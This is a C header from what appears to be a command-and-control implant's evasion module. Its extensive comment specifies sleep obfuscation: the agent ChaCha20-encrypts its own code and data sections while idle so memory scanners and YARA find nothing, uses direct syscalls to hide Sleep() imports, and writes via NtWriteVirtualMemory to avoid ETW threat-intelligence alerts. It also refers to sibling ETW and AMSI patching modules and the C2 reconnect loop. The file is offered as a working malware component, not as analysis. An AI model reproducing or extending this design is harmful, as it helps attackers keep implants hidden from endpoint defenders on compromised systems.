/*
 * client/evasion/sleep_obf.h  –  Sleep obfuscation (Ekko-variant)
 * ================================================================
 * Encrypts the agent's own .text, .data, and .rdata sections in-place while
 * the thread sleeps, and decrypts them on wake.  During the sleep interval
 * the agent image in memory is ChaCha20 keystream-XOR ciphertext — a memory
 * scanner finds no recognisable code or string patterns.
 *
 * Technique (Ekko / Foliage hybrid — no ROP required)
 * ----------------------------------------------------
 * CS 4.8 uses a timer-based APC chain (RtlCaptureContext + NtContinue gadget)
 * to execute a sequence of NT calls from a cloned context without a visible
 * call stack.  We implement the same logical sequence but use direct syscalls
 * and inline section walks, requiring no ROP gadgets:
 *
 *   1. Derive a 32-byte ChaCha20 key from BCrypt-SHA256(seed || base || size).
 *   2. Draw a fresh 12-byte nonce from BCryptGenRandom.
 *   3. Call _so_xor_image() — ChaCha20-keystream XOR the .text, .data, and
 *      .rdata sections of the agent module in 4 KB staging chunks.
 *   4. SC_NtDelayExecution for the requested interval (direct syscall —
 *      Sleep() stays out of the IAT).
 *   5. Call _so_xor_image() again with the same (key, nonce) — XOR is
 *      self-inverse, so the second pass restores the original bytes exactly.
 *   6. SecureZeroMemory both the key and nonce from the stack.  Return.
 *
 * The encrypt/decrypt functions run from a section that is NOT ciphered:
 * every internal helper is placed in ".slpobf" via
 *   __attribute__((section(".slpobf"))) __attribute__((noinline))
 * which, combined with -ffunction-sections, keeps the cipher code in its own
 * section excluded from the XOR pass at runtime.
 *
 * ChaCha20/20 key and nonce construction
 * ---------------------------------------
 * Key (32 bytes)
 *   BCrypt-SHA256( g_peb_hash_seed[4] || module_base[8] || image_size[4] )
 *   Full 256-bit digest — no truncation.  g_peb_hash_seed is an RDTSC-seeded
 *   value initialised once at agent start, so the key is unique per execution.
 *
 * Nonce (12 bytes)
 *   BCryptGenRandom — a fresh CSPRNG value on every sleep cycle.
 *   Combined with the per-run key this guarantees a unique (key, nonce) pair
 *   for every encrypt/decrypt cycle.
 *
 * Cipher: RFC 7539 ChaCha20/20
 *   State initialised to the standard sigma constant + 8 key words + block
 *   counter (0) + 3 nonce words.  20 rounds are fully unrolled (10 ×
 *   double-round macro).  XOR is applied 64 bytes at a time via a word-
 *   aligned loop (_cc20_xor_buf) that the compiler can auto-vectorise to
 *   SSE2/AVX2.  No third-party library; no BCrypt cipher API; zero allocations.
 *
 * Fallback (BCrypt unavailable)
 *   Key:   splitmix64-style non-linear expansion of g_peb_hash_seed → 32 B.
 *   Nonce: RDTSC timestamp mixed with a stack-frame address → 12 B.
 *
 * Protection model
 * ----------------
 *  • Memory scanner sees only ciphertext during sleep — no YARA hits on
 *    string patterns or code signatures.
 *  • The encrypted region is PAGE_EXECUTE_READ — we do NOT flip to RW
 *    before encrypting (that would fire ETW-Ti KERNEL_THREATINT_TASK_PROTECT).
 *    Instead we write through SC_NtWriteVirtualMemory on the current process
 *    handle, which bypasses page-protection checks for same-process writes
 *    (the same technique used by etw_patch / amsi_patch).
 *  • The .slpobf section is PAGE_EXECUTE_READ at all times and is never
 *    ciphered.  It is small (< 4 KB) and contains only the ChaCha20 block
 *    function, the XOR loop, and the BCrypt key/nonce derivation.
 *  • Key and nonce are wiped from the stack with SecureZeroMemory after both
 *    the encrypt and decrypt passes complete.
 *
 * Sections ciphered
 * -----------------
 *   .text   — executable code
 *   .data   — mutable global data
 *   .rdata  — read-only data (strings, vtables, import descriptors)
 *
 *   Excluded: .slpobf (cipher), .rsrc, .reloc, .pdata
 *
 * Activation
 * ----------
 *   #define SLEEP_OBF_ENABLE   before including this header, or pass
 *   -DSLEEP_OBF_ENABLE on the compiler command line.
 *
 *   When not defined, sleep_obf_delay() falls back to a plain jitter_sleep().
 *
 * Usage
 * -----
 *   Replace every  jitter_sleep(ms)  call in the C2 reconnect loop with:
 *     sleep_obf_delay(ms);
 *
 * Dependencies (already present)
 * --------------------------------
 *   bcrypt.lib   — BCryptOpenAlgorithmProvider / BCryptHash / BCryptGenRandom
 *   ntdll        — SC_NtWriteVirtualMemory / SC_NtDelayExecution (via syscall.h)
 */

#pragma once
#ifndef CLIENT_SLEEP_OBF_H
#define CLIENT_SLEEP_OBF_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include "syscall.h"
#include "peb_walk.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Forward — defined in sandbox.c */
void jitter_sleep(DWORD ms);

/* ── sleep_obf_delay ────────────────────────────────────────────────────── */
/*
 * Primary API.  Sleep for `ms` milliseconds with in-memory obfuscation.
 *
 * When SLEEP_OBF_ENABLE is defined:
 *   1. Derives a fresh ChaCha20/20 key (32 B, BCrypt-SHA256) and nonce
 *      (12 B, BCryptGenRandom) for this sleep cycle.
 *   2. XOR-ciphers .text, .data, and .rdata sections of the agent module
 *      using _so_xor_image() — NtWriteVirtualMemory, no VirtualProtect flip.
 *   3. Sleeps via SC_NtDelayExecution (direct syscall, not Win32 Sleep()).
 *   4. Re-applies _so_xor_image() with the same (key, nonce) to decrypt.
 *   5. Wipes key and nonce from the stack with SecureZeroMemory.
 *
 * When SLEEP_OBF_ENABLE is not defined: falls through to jitter_sleep().
 */
void sleep_obf_delay(DWORD ms);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SLEEP_OBF_H */
